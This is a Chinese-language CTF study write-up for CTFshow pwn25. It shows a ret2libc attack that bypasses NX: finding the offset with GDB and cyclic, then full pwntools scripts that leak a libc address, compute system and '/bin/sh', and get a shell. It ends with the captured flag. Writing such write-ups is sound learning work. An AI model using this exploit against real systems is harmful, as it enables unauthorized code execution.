---
title: 学习笔记 01 | 绕过 NX 保护的 Ret2libc 漏洞利用
categories:
  - 笔记
tags:
  - PWN
  - ctfshow
  - Ret2libc
  - CTF
abbrlink: ff2cdf7c
date: 2026-04-05 10:00:00
---

## 思路
（题目出自CTFshow_pwn, 链接 https://ctf.show/challenges#pwn25 ）
本程序的保护机制开启了 `NX` (No-eXecute) 保护，这意味着栈上的数据不具备可执行权限，传统的直接注入 Shellcode 方法失效。

为了绕过 NX 保护，我们可以利用程序自带的函数库（动态链接库）进行 **Ret2libc** 攻击。核心逻辑为：先通过 IDA 静态分析找到栈溢出漏洞点，再通过 ROP 链泄露某一已解析函数的真实内存地址。利用 `LibcSearcher` 检索 libc 库中相应的偏移量，推算出 `system` 函数和 `/bin/sh` 字符串的绝对地址，最终构造 Payload 劫持控制流拿到 Shell。

---

## 解题过程

### 一、 静态分析与漏洞定位

首先checksec检查程序
![checksec](/images/blog3/checksec.png)
在进行动态调试前，首先使用 IDA Pro (32-bit) 载入附件程序进行静态分析。
![IDA伪代码分析漏洞点1](/images/blog3/Ida_1.png)
![IDA伪代码分析漏洞点2](/images/blog3/Ida_2.png)
通过伪代码可以发现，程序在读取用户输入时，使用了未限制长度的危险函数（`read`） 读取的长度远大于分配给 `buf` 缓冲区的空间，这就构成了典型的**栈缓冲区溢出漏洞**。
![IDA伪代码分析漏洞点3](/images/blog3/Ida_3.png)
进一步观察 IDA 提取的栈帧结构（如图 3），buf 变量距离 __saved_registers (ebp) 为 132 字节，再加上 ebp 本身的 4 字节。由此我们可以静态推断出，覆盖到返回地址的精准偏移量应为 136 + 4 = 140 字节。 接下来我们将通过动态调试来验证这一点。

### 二、 利用 GDB 和 Cyclic 获取偏移值

确定存在溢出后，需要精准测算覆盖到返回地址（EIP）的垃圾数据长度。

1. 终端输入 `gdb ./pwn` 启动调试。
2. 新开一个终端，利用 cyclic 工具生成 200 字节的有序字符串：`cyclic 200 > pattern`
3. 切回刚才的 GDB 终端，执行 `run < pattern`
4. 当程序报 `Segmentation fault`（段错误）时，说明非法数据已经覆盖了返回地址，导致 CPU 寻址失败。我们来捕获崩溃时的 EIP 寄存器值：输入 `info register eip`
5. 得到 EIP 的值为 `0x6261616b`。
6. 输入 `q` 退出 GDB，回普通终端访问 cyclic 工具。
7. 输入 `cyclic -l 0x6261616b`，得出精准偏移量为 **140**。

### 三、 阶段性测试：编写独立地址泄露脚本

为了保证漏洞利用的稳定性，我们首先编写一段独立的测试脚本，验证是否能成功泄露底层真实地址。

```python
from pwn import *

# 配置底层环境：
# arch='i386'：声明目标是 32 位机器，这会让 p32() 和 u32() 函数生效
# os='linux'：声明目标操作系统
# log_level='debug'：开启上帝视角，终端会实时打印收发的所有底层字节流
context(arch='i386', os='linux', log_level='debug')

# 建立网络连接，也就是接靶机的端口，后续用变量 p 来与它对话
p = remote('pwn.challenge.ctf.show', 28303)
# 加载本地的 ELF 文件（也就是靶机程序），当作“静态地图”
elf = ELF('./1')

# 从“地图”中查阅我们要用到的 3 个关键坐标：
puts_plt = elf.plt['puts']    # 1. 用来执行打印动作的 puts 函数入口
read_got = elf.got['read']    # 2. 存着read函数真实内存坐标的地址
main_addr = elf.sym['main']   # 3. main 函数开头，让程序回这里续命

# 测算好的栈溢出距离，用来填满缓冲区，直达 EIP (指令寄存器)
offset = 140
 
# Payload 构造 (32位 cdecl 调用约定：函数 + 返回地址 + 参数)
payload1 =  b'A' * offset     # 填入 140 个垃圾字节，顶到EIP前
payload1 += p32(puts_plt)     # 劫持 EIP：强行跳去执行 puts 函数
payload1 += p32(main_addr)    # 伪造返回地址
payload1 += p32(read_got)     # 给 puts 的参数：打印read_got 里的内容

# 把 Payload 发送过去，并在末尾自动敲个回车
p.sendline(payload1)
 
# 拆解这句地址接收代码：
# 1. p.recvuntil(b'\xf7')：死等。因为 32 位 Linux 的真实内存地址通常以 f7 开头。等到 f7 出现，说明地址吐出来了。
# 2. [-4:]：切片操作。从刚才接收到的一大堆数据中，精准切下最后 4 个字节（也就是地址本体）。
# 3. .ljust(4, b'\x00')：安全气囊。如果 puts 打印到一半遇到了 \x00 提前截断，导致不足 4 个字节，就在右边用 \x00 强行补齐到 4 个字节，防止后面的解包报错。
# 4. u32(...)：将补齐后的 4 个字节机器码，反向翻译成 Python 里的十六进制整数。
read_real_addr = u32(p.recvuntil(b'\xf7')[-4:].ljust(4, b'\x00'))
 
# 在终端把抓到的真实地址打印出来
print(f"[*] Leak read addr: {hex(read_real_addr)}")

# 将控制权交还给键盘，验证程序是否成功回到了 main 等待输入
p.interactive()
```

### 四、 完整攻击 EXP（标准三段式）

在确认地址泄露无误后，我们引入 `LibcSearcher` 模块，完成从“地址泄露”到“基址计算”，再到“提权执行”的完整自动化攻击流程。

```python
from pwn import *
from LibcSearcher import *

context(arch='i386', os='linux', log_level='debug')
p = remote("pwn.challenge.ctf.show", 28303)
elf = ELF('./pwn')

# ================= 阶段一：泄露真实内存地址 =================
main_addr = elf.sym['main']
write_plt = elf.plt['write']
write_got = elf.got['write']

offset = 140

payload1 = b'A' * offset
payload1 += p32(write_plt)   # 1. 劫持指令：跳入 write 函数
payload1 += p32(main_addr)   # 2. 伪造返回地址：执行完 write 回 main 续命
payload1 += p32(1)           # 3. 参数 1 (fd)：1 代表屏幕
payload1 += p32(write_got)   # 4. 参数 2 (buf)：打印 write 的真实地址
payload1 += p32(4)           # 5. 参数 3 (len)：只写 4 个字节

p.sendline(payload1)
leak_write = u32(p.recv(4))
log.success(f"Leak write addr: {hex(leak_write)}")

# ================= 阶段二：计算 Libc 基址 =================
libc_obj = LibcSearcher('write', leak_write)

# 核心公式：Libc基址 = 真实绝对地址 - 相对偏移量
libc_base = leak_write - libc_obj.dump('write')
system_addr = libc_base + libc_obj.dump('system')
bin_sh_addr = libc_base + libc_obj.dump('str_bin_sh')

log.success(f"Libc base: {hex(libc_base)}")
log.success(f"System addr: {hex(system_addr)}")
log.success(f"/bin/sh addr: {hex(bin_sh_addr)}")

# ================= 阶段三：致命一击 (Payload 2) =================
# 此时程序已经回到了 main 开头，再次填入垃圾数据夺权
payload2 = b'A' * offset
payload2 += p32(system_addr)   # 1. 劫持指令：跳去 system
payload2 += p32(0)             # 2. 核心占坑：伪造返回地址 (提权后无需关心)
payload2 += p32(bin_sh_addr)   # 3. 传入参数："/bin/sh" 所在的内存地址

p.sendline(payload2)

# 交出控制权，获取交互式 Shell
p.interactive()
```

### 五、 确定系统版本号（LibcSearcher 盲盒排雷）

发送完最终 EXP 后，若遇到 LibcSearcher 弹出多个匹配版本的选项，不要盲目去猜，可以利用静态分析来辅助选择。

![LibcSearcher多选报错截图](/images/blog3/LibcSearcher.png)
*(注：服务器返回多个匹配的 Libc 库版本)*

在本地终端输入以下指令提取系统指纹：

```bash
strings ./pwn | grep Ubuntu
```

查询得到：
`GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0`

根据常识，我们知道 Ubuntu 版本号与 GLIBC 的对应关系为：
* Ubuntu 16.04 -> GLIBC 2.23
* **Ubuntu 18.04 -> GLIBC 2.27**
* Ubuntu 20.04 -> GLIBC 2.31

带着这个决定性线索，再来审视终端给出的十个选项：
* 排除 0~3（2.19 版本，属于古老的 Ubuntu 14.04）。
* 排除 4（根本不是 Ubuntu 系统的库）。
* 排除 6、9（2.17 版本，版本太老）。

剩下三个版本的唯一区别是尾部的微小补丁号（基础版、.3 补丁版、.4 补丁版）。此时迅速输入 `5` 即可成功拿到 Shell 并提取 Flag。

> **漏洞利用稳定性排错（踩坑提醒）：**
> 当出现多选弹窗时，服务器的超时断开倒计时（Timeout）仍在走。一定要迅速输入数字并回车，如果手速慢了或者 5 号小版本不对导致程序崩溃报错 `EOFError`，不要慌张，立刻重跑脚本并尝试该版本的其他补丁序号（如 7 或 8）即可。

```text
ctfshow{b513b07d-d063-400c-8429-64451fa11b8b}
```